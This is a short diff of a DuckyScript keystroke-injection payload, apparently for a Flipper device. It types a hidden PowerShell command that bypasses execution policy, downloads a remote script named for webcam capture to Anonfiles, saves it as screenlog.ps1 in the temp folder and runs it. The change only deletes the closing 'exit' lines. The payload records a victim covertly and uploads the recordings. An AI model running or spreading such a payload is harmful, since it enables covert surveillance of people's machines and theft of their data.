@@ -12,5 +12,3 @@ ENTER
 DELAY 500
 STRING powershell.exe -NoP -NonI -W Hidden -Exec Bypass -command "$Anontoken='ENTER_ANONFILES_TOKEN';$RecordTime=300;$TimesRun=24;$Delay=3600;$DaysRun=0;Invoke-RestMethod https://raw.githubusercontent.com/Agente404/flipper/main/payloads/Webcam2Anonfiles/script.ps1 -OutFile ($env:temp+'\screenlog.ps1');Invoke-Expression ($env:temp+'\screenlog.ps1');"
 ENTER
-STRING exit
-ENTER
